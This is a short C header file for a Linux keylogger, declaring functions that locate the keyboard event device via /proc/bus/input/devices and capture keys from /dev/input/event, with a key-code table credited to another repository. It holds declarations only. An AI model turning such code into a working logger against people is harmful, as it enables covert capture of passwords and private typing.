#ifndef KEYLOGGER_H
#define KEYLOGGER_H


#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
//#include <signal.h>
#include <stdlib.h>
#include <string.h>

#define GET_EVENT_PATH "/proc/bus/input/devices"
#define EVENT_PATH "/dev/input/event"
#define BUFF_LINE 128
#define BUFF_CHUNK (128 * 8)
char get_event_num();
int capture_keys(char *event_num);

//was taken from https://github.com/SCOTPAUL/keylog
 extern char *keycodes[];


#endif //KEYLOGGER_H
